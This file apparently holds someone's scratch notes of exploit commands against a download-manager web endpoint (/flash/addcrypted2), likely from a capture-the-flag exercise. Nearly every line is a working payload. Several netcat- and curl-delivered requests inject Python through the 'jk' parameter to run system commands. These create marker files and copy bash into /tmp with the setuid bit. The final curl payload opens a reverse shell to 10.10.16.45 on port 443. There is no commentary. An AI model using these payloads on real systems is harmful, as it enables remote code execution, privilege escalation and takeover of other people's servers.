
echo -e "GET / HTTP/1.1\\r\\n\\r\\n" | nc localhost 80

echo -e "POST /flash/addcrypted2 HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 143\r\njk=pyimport%20os;os.system("cp /bin/bash /tmp/fixit42; chmod +u=sx /tmp/fixit42");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n"  | nc localhost 8000

echo -e "POST /flash/addcrypted2 HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 143\r\njk=pyimport%20os;os.system("cp /bin/bash /tmp/fixit42");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n"  | nc localhost 8000

; chmod +u=sx /tmp/fixit42

echo -e "POST /flash/addcrypted2 HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nContent-Length: 143\r\njk=pyimport%20os;os.system("cp%20/bin/bash%20/tmp/fixit42");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n"  | nc localhost 8000



POST /flash/addcrypted2 HTTP/1.1\r\n
Host: 127.0.0.1:8000\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
jk=pyimport%20os;os.system("touch%20/tmp/pwnd");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n

POST /flash/addcrypted2 HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\njk=pyimport%20os;os.system("touch%20/tmp/pwnd");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n

echo -e 'POST /flash/addcrypted2 HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\njk=pyimport%20os;os.system("touch%20/tmp/pwnd");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa\r\n\r\n' | nc localhost 8000

`curl "http://127.0.0.1:8000/flash/addcrypted2" -X POST -d 'jk=pyimport%20os;os.system("cp /bin/bash /tmp/bash %26%26 chmod u=s /tmp/bash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'`

```
curl "http://127.0.0.1:8000/flash/addcrypted2" -X POST -d 'jk=pyimport%20os;os.system("python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28\%2210.10.16.45\%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28\%22bash\%22%29%27");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
```



